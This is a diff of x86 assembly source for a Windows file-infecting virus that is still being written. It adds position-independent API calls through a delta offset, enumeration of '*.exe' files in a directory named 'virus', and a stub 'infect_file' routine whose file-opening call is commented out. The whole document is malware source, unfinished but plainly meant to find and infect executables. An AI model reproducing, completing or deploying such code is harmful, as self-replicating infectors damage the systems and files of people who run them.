@@ -123,27 +123,53 @@ find_API:
 	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
-	invoke SetCurrentDirectory,addr PATH
+	lea eax,offset path_C
+	add eax,ebp
+	push eax
+	call [ebp+SetCurrentDirectoryAddress]
+	
 	lea eax,offset Win32Data
 	add eax,ebp
 	push eax
+	;push dword ptr[ebp+Win32Data]
 	lea eax,offset search_mask
 	add eax,ebp
 	push eax
+	;push dword ptr[ebp+search_mask]
 	call [ebp+FindFirstFileAAddress]
 find_next_file:
-	cmp eax , 0
+	cmp eax,0
 	je done_find
 	mov dword ptr[ebp+search_handle],eax
 	lea eax,offset Win32Data
 	add eax,ebp
 	push eax
-	push dword ptr [ebp+search_handle]
+	;lea eax,offset search_handle
+	;add eax,ebp
+	;mov eax,dword ptr[ebp+search_handle]
+	;push eax
+	;push dword ptr[ebp+Win32Data]
+	push dword ptr[ebp+search_handle]
 	call [ebp+FindNextFileAAddress]
 	jmp find_next_file
 done_find:
 	ret
-	
+infect_file:
+    call open_file
+    ret
+open_file:
+    ;push dword 0 
+    ;push dword 0x80
+    ;push dword 3
+    ;push dword 0 
+    ;push dword 01
+    ;push dword 0xc0000000
+    ;mov eax,[ebp+FileName] 
+    add eax,ebp
+    push eax 
+    ;call [ebp+CreateFileAAdd]        ;Gets the File Handle for use in CreateFileMapping
+    mov dword ptr[ebp+file_handle],eax 
+    ret		
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;---------------------------Check kernel32 function----------------------------------------;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;			
@@ -328,7 +354,8 @@ end_objecttable:
 
 image_base    				dd    0h 
 kernel_string   		      	db    "kernel32.dll", 0 
-search_mask    				db    "*.exe", 0 
+search_mask    				db    "*.exe", 0
+path_C					db	"C:\Documents and Settings\Administrator\Desktop\virus\",0 
 handle       				dd    0h
 GetProc     				dd    0h
 file_handle    				dd    0h
@@ -370,7 +397,7 @@ APIName:
 	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
 	CloseHandleStr        		db    "CloseHandle", 0 
 	VirtualProtectStr    		db    "VirtualProtect", 0
-	SetCurrentDirectoryStr		db	"SetCurrentDirectory", 0
+	SetCurrentDirectoryStr		db	"SetCurrentDirectoryA", 0
 APIAddress:
 	FindNextFileAAddress    	 	dd    0h
 	FindFirstFileAAddress   	 	dd    0h
